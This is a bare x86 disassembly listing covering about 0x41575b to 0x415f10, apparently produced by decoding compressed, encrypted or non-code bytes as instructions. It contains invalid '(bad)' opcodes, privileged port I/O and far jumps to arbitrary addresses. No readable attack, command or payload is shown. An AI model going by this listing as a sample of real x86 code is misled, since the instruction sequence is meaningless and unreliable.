  41575b:	retf   0x59f8
  41575e:	jmp    0x328a8683
  415763:	sbb    BYTE PTR [edi],0xf8
  415766:	ins    DWORD PTR es:[edi],dx
  415767:	rcl    DWORD PTR [esi],0xd1
  41576a:	pop    edx
  41576b:	sbb    DWORD PTR [esi-0x6e],ebx
  41576e:	push   0xeacc2e13
  415773:	dec    eax
  415774:	std    
  415775:	inc    ecx
  415776:	and    al,0x2f
  415778:	call   FWORD PTR [edi+0x8ec6729]
  41577e:	sti    
  41577f:	sub    bl,0x89
  415782:	and    al,0xe9
  415784:	arpl   WORD PTR ds:[ebp+0x4bbc53a0],di
  41578b:	adc    esi,DWORD PTR [eax+0x31a1a814]
  415791:	test   BYTE PTR [ebx],cl
  415793:	dec    ebp
  415794:	jno    0x4157b2
  415796:	jg     0x415801
  415798:	pop    ebp
  415799:	into   
  41579a:	out    dx,al
  41579b:	cmp    ecx,ebx
  41579d:	lods   al,BYTE PTR ds:[esi]
  41579e:	dec    ebx
  41579f:	fld    TBYTE PTR [edi+0x18]
  4157a2:	pop    ebp
  4157a3:	test   al,0x34
  4157a5:	adc    al,0x23
  4157a7:	data16 mov al,al
  4157aa:	sahf   
  4157ab:	frstor ds:0x796bee43
  4157b1:	or     DWORD PTR [esi],eax
  4157b3:	(bad)  
  4157b5:	aas    
  4157b6:	out    0x7a,eax
  4157b8:	pusha  
  4157b9:	popa   
  4157ba:	retf   0x88ad
  4157bd:	loopne 0x415793
  4157bf:	dec    eax
  4157c0:	ins    DWORD PTR es:[edi],dx
  4157c1:	ins    BYTE PTR es:[edi],dx
  4157c2:	out    0xd8,eax
  4157c4:	(bad)  
  4157c5:	lock add ch,BYTE PTR [esi+0x2e]
  4157c9:	fmul   QWORD PTR [edi]
  4157cb:	arpl   WORD PTR [ebx+0x3585bd4e],sp
  4157d1:	inc    esp
  4157d2:	mov    esp,0xff5b60a0
  4157d7:	repnz cmp cl,BYTE PTR [eax-0x19]
  4157db:	stc    
  4157dc:	call   0xeaa7:0x4f741739
  4157e3:	xor    BYTE PTR [ecx+ebx*8],cl
  4157e6:	xchg   esp,eax
  4157e7:	mov    al,ds:0x97c30685
  4157ec:	push   ds
  4157ed:	jne    0x4157e4
  4157ef:	jne    0x41584d
  4157f1:	je     0x4157e1
  4157f3:	test   al,0x8c
  4157f5:	out    0x69,al
  4157f7:	push   es
  4157f8:	push   ss
  4157f9:	ins    DWORD PTR es:[edi],dx
  4157fa:	out    dx,eax
  4157fb:	mov    al,ds:0xb5ddb0d0
  415800:	fucomi st,st(0)
  415802:	sub    bl,dh
  415804:	pop    esi
  415805:	pop    ds
  415806:	out    0xcf,al
  415808:	cmp    bl,dh
  41580a:	jecxz  0x4157c9
  41580c:	sbb    BYTE PTR [ecx-0x2c],ah
  41580f:	fsubr  QWORD PTR [edx]
  415811:	bound  ebx,QWORD PTR [edx-0x11cbbdd4]
  415817:	xchg   esi,eax
  415818:	sub    BYTE PTR [edx+0x6459f347],ah
  41581e:	lods   eax,DWORD PTR ds:[esi]
  41581f:	mov    al,ds:0x7b770c3f
  415824:	jp     0x4157ca
  415826:	or     ch,BYTE PTR [edx]
  415828:	div    BYTE PTR [esi+ebp*8+0x3a]
  41582c:	test   eax,0xab4cc7a3
  415832:	addr16 test al,0xbf
  415835:	mov    dl,0x6
  415837:	repnz mov al,0x39
  41583a:	mov    esi,0xdb14cd30
  41583f:	dec    esp
  415840:	pop    esi
  415841:	outs   dx,DWORD PTR ds:[esi]
  415842:	pop    esp
  415843:	aaa    
  415844:	imul   edi,DWORD PTR [edi-0x17],0x2e
  415848:	add    ah,BYTE PTR [ecx+0x61]
  41584b:	mov    ebx,0x7954b1aa
  415850:	call   0xc37d:0xe24aedff
  415857:	or     eax,0xf23abefd
  41585c:	test   eax,0x21a0ac2b
  415861:	out    0x1c,al
  415863:	mov    ah,0xcb
  415865:	fsubrp st(4),st
  415867:	xchg   ebp,eax
  415868:	pop    ecx
  415869:	enter  0xadf1,0x22
  41586d:	mov    ebp,DWORD PTR [ecx]
  41586f:	addr16 pop esi
  415871:	dec    edx
  415872:	out    0x3f,eax
  415874:	mov    ecx,0x42a108b7
  415879:	mov    DWORD PTR [ebx+0x6],eax
  41587c:	jmp    0x41584a
  41587e:	in     al,dx
  41587f:	int3   
  415880:	pop    esi
  415881:	sub    al,0x70
  415883:	dec    ebx
  415884:	daa    
  415885:	clc    
  415886:	push   edx
  415887:	mov    dh,0xbe
  415889:	pusha  
  41588a:	out    0x96,al
  41588c:	clc    
  41588d:	mov    ebx,DWORD PTR [eax+ecx*2+0x75ed3d8d]
  415894:	pop    ss
  415895:	mul    BYTE PTR [edx-0x57]
  415898:	and    bh,BYTE PTR [ebx]
  41589a:	sbb    BYTE PTR gs:[esi+0x5990972d],0xbd
  4158a2:	nop
  4158a3:	popa   
  4158a4:	push   eax
  4158a5:	mov    ch,0xf0
  4158a7:	in     al,dx
  4158a8:	loope  0x41590d
  4158aa:	out    dx,al
  4158ab:	arpl   WORD PTR [ebp-0x2d40d0c9],ax
  4158b1:	xchg   esi,eax
  4158b2:	fisttp WORD PTR [edi+0x21877576]
  4158b8:	mov    esp,0x336771f
  4158bd:	jge    0x4158ad
  4158bf:	aad    0xd7
  4158c1:	dec    eax
  4158c2:	mov    WORD PTR [ebx-0x3d],ss
  4158c5:	sbb    al,0xb1
  4158c7:	fwait
  4158c8:	js     0x41589a
  4158ca:	neg    DWORD PTR [ebx-0x23]
  4158cd:	push   0x411982ad
  4158d2:	sub    bh,BYTE PTR [ebx+eiz*2+0x53]
  4158d6:	or     bh,BYTE PTR [ebx]
  4158d8:	lahf   
  4158d9:	inc    eax
  4158da:	(bad)  
  4158db:	xor    esp,DWORD PTR [ecx]
  4158dd:	sar    ah,0xaa
  4158e0:	dec    edi
  4158e1:	jno    0x4158d1
  4158e3:	cdq    
  4158e4:	rol    BYTE PTR [eax+0x1b8ef1b9],0xee
  4158eb:	push   ss
  4158ec:	inc    esi
  4158ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ee:	mov    esp,0x51d1c7fe
  4158f3:	cmc    
  4158f4:	add    BYTE PTR [ecx+0x66],ah
  4158f7:	int3   
  4158f8:	popa   
  4158f9:	jmp    0x415968
  4158fb:	mov    al,0x3d
  4158fd:	xchg   edi,eax
  4158fe:	out    dx,al
  4158ff:	repnz and DWORD PTR [edx],ecx
  415902:	pop    eax
  415903:	loop   0x4158d4
  415905:	inc    ecx
  415906:	add    esp,DWORD PTR [ecx+0x34e1a455]
  41590c:	xor    al,0xad
  41590e:	fstp   QWORD PTR [edi+0x5e]
  415911:	test   BYTE PTR [edi],cl
  415913:	gs cmp al,0xf3
  415916:	xlat   BYTE PTR ds:[ebx]
  415917:	cwde   
  415918:	push   ds
  415919:	pop    edx
  41591a:	repz loope 0x415976
  41591d:	dec    esp
  41591e:	icebp  
  41591f:	loopne 0x41590a
  415921:	nop
  415922:	sbb    BYTE PTR [ebx-0x6e6ac8a5],bh
  415928:	(bad)  
  415929:	outs   dx,BYTE PTR ds:[esi]
  41592a:	mov    esi,0x470ad431
  41592f:	mov    eax,ds:0xec3b6301
  415934:	lock pop ebp
  415936:	clc    
  415937:	sbb    ah,BYTE PTR [ebp+eiz*4+0x50]
  41593b:	cmp    bl,BYTE PTR [edx+0x624de63e]
  415941:	and    DWORD PTR ds:0x2f60bb77,esi
  415947:	sub    DWORD PTR [ecx-0x704fb020],eax
  41594d:	jecxz  0x41593d
  41594f:	push   es
  415950:	mov    ah,BYTE PTR [ebx+ebx*8]
  415953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415954:	in     eax,0x48
  415956:	mov    eax,es:0x2cea3760
  41595c:	adc    eax,0x5edae952
  415961:	out    0x7e,al
  415963:	popa   
  415964:	(bad)  
  415965:	cld    
  415966:	stos   DWORD PTR es:[edi],eax
  415967:	inc    eax
  415968:	outs   dx,DWORD PTR ds:[esi]
  415969:	pusha  
  41596a:	sbb    esi,DWORD PTR [ecx]
  41596c:	and    BYTE PTR [edx+edx*2-0x34],bh
  415970:	jno    0x4159d9
  415972:	out    dx,al
  415973:	sbb    al,0x78
  415975:	cmc    
  415976:	cmp    al,BYTE PTR [ebp-0xd8150dd]
  41597c:	mov    ebp,0xc87a8460
  415981:	rcl    DWORD PTR [ebx+0x44],0xe6
  415985:	mov    esi,0xe7eb57ee
  41598a:	add    dl,BYTE PTR [edi-0x71cef7c9]
  415990:	test   eax,0xbae1964f
  415995:	(bad)  
  415997:	mov    ecx,0x81ee072d
  41599c:	pop    edx
  41599d:	ret    
  41599e:	jbe    0x4159e4
  4159a0:	push   ecx
  4159a1:	cmp    BYTE PTR ds:0xbc5f86e9,dh
  4159a7:	push   0x12e0e7c9
  4159ac:	clc    
  4159ad:	xor    BYTE PTR [ecx+0x6c04221],ah
  4159b3:	adc    eax,0xe76e7852
  4159b8:	sub    eax,0x869b0ac4
  4159bd:	pop    edi
  4159be:	or     ebp,DWORD PTR [esi-0x4c8cd1d5]
  4159c4:	or     eax,0x23ab7221
  4159c9:	pop    edx
  4159ca:	out    dx,al
  4159cb:	outs   dx,BYTE PTR ds:[esi]
  4159cc:	xchg   ecx,eax
  4159cd:	les    esi,FWORD PTR ds:0xfdc91f17
  4159d3:	mov    al,ds:0xf4917445
  4159d8:	sub    ecx,DWORD PTR [edx+0x3a]
  4159db:	mov    ch,0x5e
  4159dd:	aaa    
  4159de:	push   esp
  4159df:	mov    dh,0x4e
  4159e1:	jne    0x415a45
  4159e3:	push   cs
  4159e4:	lods   eax,DWORD PTR ds:[esi]
  4159e5:	pusha  
  4159e6:	rol    eax,0xe7
  4159e9:	call   0x5cceca65
  4159ee:	out    dx,al
  4159ef:	ss push ebx
  4159f1:	int    0x30
  4159f3:	mul    bl
  4159f5:	scas   eax,DWORD PTR es:[edi]
  4159f6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4159f8:	in     al,0xa5
  4159fa:	inc    eax
  4159fb:	push   esp
  4159fc:	fidivr DWORD PTR es:[ecx-0x1f]
  415a00:	mov    dh,0x8c
  415a02:	adc    al,BYTE PTR [edx]
  415a04:	xor    al,0x3f
  415a06:	repnz cdq 
  415a08:	or     al,BYTE PTR [esi-0x6eebde62]
  415a0e:	jo     0x4159e8
  415a10:	inc    esi
  415a11:	popa   
  415a12:	and    BYTE PTR [edx+ecx*2-0x22],bl
  415a16:	adc    BYTE PTR [eax+esi*8+0x46],ah
  415a1a:	jmp    0x415a58
  415a1c:	std    
  415a1d:	ins    DWORD PTR es:[edi],dx
  415a1e:	repz push DWORD PTR [eax+esi*4+0x612d3672]
  415a26:	test   al,0x89
  415a28:	(bad)  
  415a29:	mov    ds:0xc619cd5,al
  415a2e:	jmp    0x4159ca
  415a30:	ret    
  415a31:	add    eax,0xb83fd46d
  415a36:	addr16 dec ebp
  415a38:	jp     0x415a50
  415a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a3b:	mov    eax,ds:0xa2993799
  415a40:	jecxz  0x415a73
  415a42:	push   0xb6dc5f6b
  415a47:	ins    BYTE PTR es:[edi],dx
  415a48:	mov    edx,0xd330f2c6
  415a4d:	push   eax
  415a4e:	mov    cl,0xa7
  415a50:	jl     0x415a67
  415a52:	out    dx,eax
  415a53:	call   0x6f6e:0x73e64db2
  415a5a:	pushf  
  415a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a5c:	xor    DWORD PTR [edi+0xf44a492],eax
  415a62:	pop    ds
  415a63:	fcomp  QWORD PTR [bx+si+0x16bf]
  415a68:	cmp    BYTE PTR [ebx+0x7],al
  415a6b:	dec    ebp
  415a6c:	enter  0xb65d,0x1e
  415a70:	(bad)  
  415a71:	lahf   
  415a72:	pop    esi
  415a73:	(bad)  
  415a74:	and    bh,BYTE PTR [ebp-0xb]
  415a77:	cmp    al,0xd2
  415a79:	test   al,0x1f
  415a7b:	clc    
  415a7c:	pop    ebp
  415a7d:	adc    BYTE PTR [edi+0x4e],bl
  415a80:	mov    eax,eax
  415a82:	out    dx,eax
  415a83:	jmp    0xfb88:0x6c8a9d5c
  415a8a:	je     0x415a2d
  415a8c:	popf   
  415a8d:	jmp    0xffa7:0x6f7e3845
  415a94:	js     0x415aac
  415a96:	out    dx,al
  415a97:	dec    eax
  415a98:	add    al,0x3c
  415a9a:	inc    edi
  415a9b:	dec    edi
  415a9c:	push   eax
  415a9d:	jbe    0x415a50
  415a9f:	mov    al,ds:0xe56e7d24
  415aa4:	push   0x5eb40e85
  415aa9:	and    dl,BYTE PTR [ebx+0x2ac7cadd]
  415aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab0:	ins    DWORD PTR es:[edi],dx
  415ab1:	test   al,0xd5
  415ab3:	mov    al,ds:0xe783ff
  415ab8:	pop    edx
  415ab9:	push   ecx
  415abb:	jb     0x415af3
  415abd:	(bad)  
  415abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abf:	mov    ds:0xf0063533,al
  415ac4:	fild   WORD PTR [ecx+0x430e0536]
  415aca:	push   edi
  415acb:	pop    es
  415acc:	adc    BYTE PTR [ecx+0xc5710bf],ah
  415ad2:	push   ecx
  415ad3:	fdiv   QWORD PTR [esi]
  415ad5:	test   al,0x38
  415ad7:	and    BYTE PTR [edx-0x1c],ch
  415ada:	inc    edx
  415adb:	add    esi,esp
  415add:	inc    ebx
  415ade:	in     al,0x7a
  415ae0:	push   ds
  415ae1:	adc    eax,0xa938c759
  415ae6:	push   0x5
  415ae8:	or     ah,BYTE PTR [esi-0x38779ed8]
  415aee:	sti    
  415aef:	cmp    eax,0xb66fe75e
  415af4:	or     ah,0xf9
  415af7:	push   ecx
  415af8:	iret   
  415af9:	pusha  
  415afa:	jns    0x415ae2
  415afc:	stos   DWORD PTR es:[edi],eax
  415afd:	push   ebx
  415afe:	dec    ebx
  415aff:	dec    bl
  415b01:	jbe    0x415aea
  415b03:	inc    edx
  415b04:	inc    esi
  415b05:	jge    0x415ada
  415b07:	(bad)  
  415b08:	ds and al,0xd
  415b0b:	lods   al,BYTE PTR ds:[esi]
  415b0c:	and    al,0xbb
  415b0e:	dec    esi
  415b0f:	(bad)  
  415b10:	xchg   edx,eax
  415b11:	outs   dx,DWORD PTR ds:[esi]
  415b12:	das    
  415b13:	mov    eax,ds:0x1c9f32ae
  415b18:	cld    
  415b19:	lea    edx,[esi]
  415b1b:	fild   DWORD PTR [esi+0x5ee85ef5]
  415b21:	in     al,dx
  415b22:	mov    ecx,DWORD PTR [ebx+ebx*2]
  415b25:	adc    BYTE PTR [edi+0x39],al
  415b28:	push   edi
  415b29:	mov    bh,0xde
  415b2b:	mov    eax,ds:0xfc9cdad1
  415b30:	add    al,0xc7
  415b32:	sahf   
  415b33:	jns    0x415b77
  415b35:	lods   al,BYTE PTR ds:[esi]
  415b36:	in     al,dx
  415b37:	mov    edi,0x5838655c
  415b3c:	mov    BYTE PTR [eax-0x4d3a3ed1],ah
  415b42:	mov    BYTE PTR [ecx+0x1df5c223],ah
  415b48:	js     0x415b72
  415b4a:	xor    al,0xcd
  415b4c:	push   ebx
  415b4d:	push   ecx
  415b4e:	mov    edx,0x5fbb9d80
  415b53:	pop    eax
  415b54:	pop    edx
  415b55:	mov    ecx,0xe6e760e4
  415b5a:	mov    ebp,0x22875e6c
  415b5f:	inc    edx
  415b60:	cmp    al,0x95
  415b62:	push   ss
  415b63:	mov    bh,0xad
  415b65:	pop    esp
  415b66:	mov    ch,0x44
  415b68:	(bad)  
  415b69:	into   
  415b6a:	lock pusha 
  415b6c:	mov    al,0xcb
  415b6e:	xchg   edx,eax
  415b6f:	sub    bl,BYTE PTR [ebx+0x58]
  415b72:	xchg   edi,eax
  415b73:	(bad)  
  415b74:	fstp   QWORD PTR [esi+ebx*1]
  415b77:	sbb    eax,0xa14ad78a
  415b7c:	adc    BYTE PTR [edi],ch
  415b7e:	popf   
  415b7f:	inc    edi
  415b80:	cdq    
  415b81:	or     eax,0x9f5e1319
  415b86:	ret    0x7795
  415b89:	mov    bl,0x24
  415b8b:	dec    esp
  415b8c:	mov    ebp,0x34e26b60
  415b91:	inc    esp
  415b92:	mov    BYTE PTR [edx+0x2f],dh
  415b95:	sub    ebp,esp
  415b97:	mov    eax,0x7c5c7f29
  415b9c:	push   0x9ca1570b
  415ba1:	ss inc eax
  415ba3:	enter  0xb2c5,0x8
  415ba7:	(bad)  
  415ba8:	sbb    bh,BYTE PTR [edi+0x607440fb]
  415bae:	mov    ds:0x7b33d936,eax
  415bb3:	stos   DWORD PTR es:[edi],eax
  415bb4:	pop    esi
  415bb5:	in     eax,dx
  415bb6:	repnz mov cl,BYTE PTR [ebp-0x26]
  415bba:	mov    eax,ds:0x5068da8e
  415bbf:	mov    ecx,0xda5660f6
  415bc4:	push   cs
  415bc5:	nop
  415bc6:	aad    0x96
  415bc8:	push   ebx
  415bc9:	stos   DWORD PTR es:[edi],eax
  415bca:	out    dx,al
  415bcb:	lds    esi,FWORD PTR [ecx]
  415bcd:	mov    ah,0x40
  415bcf:	fld    TBYTE PTR [ebx]
  415bd1:	ins    BYTE PTR es:[edi],dx
  415bd2:	iret   
  415bd3:	mov    al,ds:0x86d852b7
  415bd8:	aaa    
  415bd9:	push   cs
  415bda:	call   0x118e:0xbf5a5daa
  415be1:	dec    ecx
  415be2:	cmp    DWORD PTR [bp-0xd],edi
  415be6:	test   DWORD PTR [ecx+eax*1+0x5e5ac84f],ebx
  415bed:	dec    edx
  415bee:	xor    edx,eax
  415bf0:	sbb    cl,BYTE PTR [edx-0x6ea129a8]
  415bf6:	adc    esi,DWORD PTR [edx]
  415bf8:	mov    dl,BYTE PTR [esi-0x1a]
  415bfb:	jb     0x415bf4
  415bfd:	inc    ebx
  415bfe:	mov    ch,BYTE PTR [edx]
  415c00:	pminub mm3,QWORD PTR [ecx]
  415c03:	fisttp WORD PTR [edi+0x11]
  415c06:	push   ds
  415c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c08:	sbb    al,BYTE PTR [edx+0x47c8beb]
  415c0e:	in     al,0xe6
  415c10:	frstor [eax+0x72]
  415c13:	push   esp
  415c14:	adc    ebx,edi
  415c16:	test   DWORD PTR [edx-0x69],eax
  415c19:	mov    cl,0xee
  415c1b:	mov    ebx,0x4522639
  415c20:	into   
  415c21:	sub    esp,DWORD PTR [eax-0x2b4f05c]
  415c27:	fdiv   DWORD PTR [eax]
  415c2a:	xchg   esi,eax
  415c2b:	std    
  415c2c:	jl     0x415bbd
  415c2e:	hlt    
  415c2f:	rcr    DWORD PTR [esi+0x5e2c761e],0x15
  415c36:	das    
  415c37:	outs   dx,BYTE PTR ds:[esi]
  415c38:	push   esp
  415c39:	mov    edx,0xb4c4a0ea
  415c3e:	pop    ebx
  415c3f:	stos   DWORD PTR es:[edi],eax
  415c40:	jmp    0x415be2
  415c42:	lahf   
  415c43:	rol    BYTE PTR [edx-0x37],cl
  415c46:	lods   al,BYTE PTR ds:[esi]
  415c47:	outs   dx,DWORD PTR ds:[esi]
  415c48:	pop    ebp
  415c49:	je     0x415c89
  415c4b:	lahf   
  415c4c:	in     eax,0x88
  415c4e:	pop    edx
  415c4f:	adc    BYTE PTR [edx],bl
  415c51:	inc    ebx
  415c52:	jle    0x415bf7
  415c54:	addr16 mov al,ds:0x548b
  415c58:	inc    esi
  415c59:	jne    0x415c29
  415c5b:	test   BYTE PTR [edx+0x4f],bl
  415c5e:	out    dx,al
  415c5f:	add    eax,0x7e27ebf1
  415c64:	mov    ebx,0x6fa16995
  415c69:	mov    al,ds:0x31fd44b2
  415c6e:	call   0x52a8c0ed
  415c73:	or     cl,BYTE PTR [ebx]
  415c75:	sahf   
  415c76:	jb     0x415c59
  415c78:	out    0xa0,al
  415c7a:	xchg   edi,eax
  415c7b:	ret    
  415c7c:	mov    al,ds:0x207f7360
  415c81:	stc    
  415c82:	(bad)  
  415c84:	mov    BYTE PTR [edi-0x56fafa12],al
  415c8a:	jne    0x415cc9
  415c8c:	mov    edx,0x97a2570a
  415c91:	sbb    al,0x97
  415c93:	popf   
  415c94:	mov    esi,0xaa58c299
  415c99:	or     al,0xf0
  415c9b:	(bad)  
  415c9c:	retf   
  415c9d:	mov    ds:0x4e7f2138,eax
  415ca2:	add    eax,0x41a8c89f
  415ca7:	mov    ds:0xd5d2cf26,al
  415cac:	les    edx,FWORD PTR ds:0x5acaf0b0
  415cb2:	jle    0x415c6f
  415cb4:	pop    esi
  415cb5:	cmp    eax,0xcc415145
  415cba:	mov    WORD PTR [ecx-0x35],fs
  415cbd:	and    DWORD PTR [ecx+esi*1+0x35],eax
  415cc1:	pop    edx
  415cc2:	and    al,0xe2
  415cc4:	add    DWORD PTR [eax-0x21],edx
  415cc7:	out    0x95,eax
  415cc9:	mov    eax,ds:0x4887d2ce
  415cce:	test   al,0x13
  415cd0:	push   0xffffffb1
  415cd2:	out    dx,al
  415cd3:	push   DWORD PTR [eax+0x7fdcfe70]
  415cd9:	cmp    DWORD PTR [edi-0x3a2c6359],0x5420f015
  415ce3:	scas   al,BYTE PTR es:[edi]
  415ce4:	scas   al,BYTE PTR es:[edi]
  415ce5:	pop    esi
  415ce6:	out    0xd7,eax
  415ce8:	cs adc al,0x5b
  415ceb:	das    
  415cec:	aam    0x40
  415cee:	icebp  
  415cef:	mov    esp,0xa15d8263
  415cf4:	push   edx
  415cf5:	sub    edx,edi
  415cf7:	jb     0x415d0e
  415cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cfa:	sub    bl,cl
  415cfc:	gs cdq 
  415cfe:	inc    eax
  415cff:	xor    DWORD PTR [eax],edi
  415d01:	popa   
  415d02:	or     al,0x4c
  415d04:	ret    
  415d05:	or     al,0x41
  415d07:	mov    eax,ds:0x6dace6f8
  415d0c:	repz mov edi,0x3d5edf9b
  415d12:	xchg   edx,eax
  415d13:	push   es
  415d14:	jns    0x415ca4
  415d16:	xor    eax,0x225db99
  415d1b:	mov    eax,ds:0x8ae833cb
  415d20:	loop   0x415caf
  415d22:	or     eax,0x901d5ece
  415d27:	jnp    0x415d2d
  415d29:	fdivrp st(3),st
  415d2b:	xor    eax,0xaeacaf4b
  415d30:	push   eax
  415d31:	je     0x415cd1
  415d33:	mov    BYTE PTR [esi],0x95
  415d36:	pop    esp
  415d37:	mov    dh,0xed
  415d39:	mov    bl,0x1
  415d3b:	add    BYTE PTR [eax-0x19],ch
  415d3e:	outs   dx,BYTE PTR ds:[esi]
  415d3f:	dec    eax
  415d40:	stos   DWORD PTR es:[edi],eax
  415d41:	push   eax
  415d42:	js     0x415d6c
  415d44:	xor    al,0x61
  415d46:	inc    esi
  415d47:	ret    0xbb2f
  415d4a:	les    esp,FWORD PTR [edi+0x68ec0165]
  415d50:	mov    bl,BYTE PTR [ecx+ecx*1+0x4b]
  415d54:	addr16 jmp 0x5aa62e2f
  415d5a:	mov    cl,0x7f
  415d5c:	cmp    al,0xd6
  415d5e:	cmp    al,0xf1
  415d60:	mov    dh,0x23
  415d62:	daa    
  415d63:	xor    DWORD PTR [edx+0x57],0xd09fd901
  415d6a:	sbb    DWORD PTR ds:0x48dbf05e,0xa0c7d98a
  415d74:	mov    bh,0xc1
  415d76:	xchg   ebx,eax
  415d77:	aad    0x83
  415d79:	es mov ch,0xbc
  415d7c:	pop    esi
  415d7d:	xchg   BYTE PTR [ebx-0x7a],ah
  415d80:	mov    ebx,0xcee92f07
  415d85:	pusha  
  415d86:	jmp    0x69162d43
  415d8b:	inc    esi
  415d8c:	lods   al,BYTE PTR ds:[esi]
  415d8d:	shr    dh,0x9
  415d90:	pop    esp
  415d91:	or     eax,0x4707be9f
  415d96:	jle    0x415d39
  415d98:	pop    ebx
  415d99:	sub    dh,BYTE PTR [ebx+0x58]
  415d9c:	fimul  DWORD PTR [ebx]
  415d9e:	jg     0x415dd8
  415da0:	pop    esi
  415da1:	push   es
  415da2:	rcr    BYTE PTR [edi-0x65],cl
  415da5:	mov    dh,0xb0
  415da7:	mov    BYTE PTR [eax+eiz*2-0x5d],ah
  415dab:	imul   eax,DWORD PTR ds:0xc0d5ce6e,0xffffffc0
  415db2:	sub    ebp,esi
  415db4:	pop    ebp
  415db5:	and    edx,esp
  415db7:	mov    dl,0x8f
  415db9:	xor    DWORD PTR [edi+0x2f],edx
  415dbc:	xchg   esi,eax
  415dbd:	ret    
  415dbe:	es scas al,BYTE PTR es:[edi]
  415dc0:	push   0xffffffba
  415dc2:	jg     0x415d56
  415dc4:	in     al,dx
  415dc5:	pusha  
  415dc6:	clc    
  415dc7:	mov    bl,0xe5
  415dc9:	add    DWORD PTR [esi+0x1b],esi
  415dcc:	pusha  
  415dcd:	pop    ecx
  415dce:	retf   0xf1ad
  415dd1:	adc    eax,0xcf2200c6
  415dd6:	and    BYTE PTR [eax-0x4153e5ca],0x7e
  415ddd:	loopne 0x415d6f
  415ddf:	push   0xbfee2528
  415de4:	(bad)  
  415de5:	xor    eax,0x9b035842
  415dea:	mov    DWORD PTR [ebp-0x4c06f308],esp
  415df0:	gs loope 0x415e11
  415df3:	cmp    BYTE PTR [ecx+ecx*4],0xed
  415df7:	test   DWORD PTR [ebp-0x3f],ebx
  415dfa:	mov    ds:0x4a16c38c,eax
  415dff:	and    bh,BYTE PTR [ebx+0x65]
  415e02:	jp     0x415e24
  415e04:	fisubr WORD PTR [edx-0x3476808b]
  415e0a:	je     0x415dbc
  415e0c:	pop    esi
  415e0d:	jmp    0x415df8
  415e0f:	xor    eax,0x9dd18a6a
  415e14:	gs popa 
  415e16:	and    al,0x18
  415e18:	loop   0x415e49
  415e1a:	in     al,0xf4
  415e1c:	adc    eax,0x1d912114
  415e21:	sub    ebp,esi
  415e23:	sub    DWORD PTR [esi+0x1e],esi
  415e26:	rcl    DWORD PTR [ecx+0x27],cl
  415e29:	pusha  
  415e2a:	jne    0x415dce
  415e2c:	je     0x415df0
  415e2e:	stos   DWORD PTR es:[edi],eax
  415e2f:	cdq    
  415e30:	adc    eax,0x6e597ebe
  415e35:	sbb    dh,ch
  415e37:	fstp   DWORD PTR [edx]
  415e39:	add    ebx,eax
  415e3b:	out    0x46,eax
  415e3d:	mov    WORD PTR [eax+eiz*4-0x79606846],gs
  415e44:	inc    edi
  415e45:	bound  edx,QWORD PTR [ecx]
  415e47:	stos   DWORD PTR es:[edi],eax
  415e48:	pop    ecx
  415e49:	cdq    
  415e4a:	dec    eax
  415e4b:	sbb    ch,bh
  415e4d:	pop    esi
  415e4e:	lahf   
  415e4f:	popa   
  415e50:	xchg   eax,ecx
  415e52:	loopne 0x415e84
  415e54:	pop    esi
  415e55:	lahf   
  415e56:	mov    ?,WORD PTR [ecx-0x9]
  415e59:	pop    es
  415e5a:	inc    ebp
  415e5b:	jb     0x415e8a
  415e5d:	dec    esi
  415e5e:	(bad)  
  415e5f:	jmp    FWORD PTR [ecx]
  415e61:	pop    esp
  415e62:	xor    eax,0xe59971ce
  415e67:	shl    ch,cl
  415e69:	dec    esi
  415e6a:	test   BYTE PTR [bp+di],ch
  415e6d:	and    DWORD PTR [ebx-0x11a1f291],ebx
  415e73:	fs repz cwde 
  415e76:	mov    ch,0xf5
  415e78:	pop    ebp
  415e79:	shr    BYTE PTR ds:0x867da9f,0x99
  415e80:	jmp    FWORD PTR [edi-0x49]
  415e83:	adc    edx,DWORD PTR [edi-0x6bc9d11c]
  415e89:	jo     0x415e79
  415e8b:	mov    ch,0x1c
  415e8d:	shl    cl,0xbd
  415e90:	mov    eax,ds:0x249f7ce3
  415e95:	sbb    DWORD PTR [ebx+esi*4+0x740c61de],edi
  415e9c:	xchg   edi,eax
  415e9d:	cmp    esi,ebp
  415e9f:	xlat   BYTE PTR ds:[ebx]
  415ea0:	adc    bh,BYTE PTR [edx+0x2]
  415ea3:	pop    ebx
  415ea4:	shl    BYTE PTR [ebp-0x77],1
  415ea7:	mov    ecx,0xa46a24a6
  415eac:	test   BYTE PTR [eax],ah
  415eae:	adc    BYTE PTR [esi+eiz*2+0x10],ch
  415eb2:	xchg   esi,eax
  415eb3:	pop    esp
  415eb4:	int3   
  415eb5:	imul   esp,DWORD PTR [eax],0x72448f0f
  415ebb:	cmp    al,0x1e
  415ebd:	and    al,0x6b
  415ebf:	daa    
  415ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ec1:	imul   edx,ebx,0xffffffa0
  415ec4:	inc    esi
  415ec5:	mov    edi,0x4dedfa03
  415eca:	js     0x415f21
  415ecc:	pop    esi
  415ecd:	cmp    cl,BYTE PTR [esi]
  415ecf:	lock stos DWORD PTR es:[edi],eax
  415ed1:	xlat   BYTE PTR ds:[ebx]
  415ed2:	fidiv  WORD PTR [ecx-0x1129f01]
  415ed8:	add    esi,DWORD PTR [esp+ebp*2+0x1f]
  415edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415edd:	arpl   di,di
  415edf:	jle    0x415f40
  415ee1:	test   al,0x6f
  415ee3:	cld    
  415ee4:	vpminsw xmm0,xmm5,XMMWORD PTR [eax]
  415ee8:	mov    ebx,esi
  415eea:	push   ebp
  415eeb:	pop    ss
  415eec:	mul    BYTE PTR [eax-0x2a]
  415eef:	jecxz  0x415f0c
  415ef1:	dec    edi
  415ef2:	mov    dl,0x60
  415ef4:	cmp    eax,0xc20ee4c
  415ef9:	jle    0x415f0e
  415efb:	add    eax,0xa8048b35
  415f00:	(bad)  
  415f01:	fstp   QWORD PTR [ebp-0x7d7eef4f]
  415f07:	sbb    edi,DWORD PTR [ebp+0x4b]
  415f0a:	out    dx,al
  415f0b:	mov    eax,0x46fbc8da
  415f10:	jbe    0x415f07
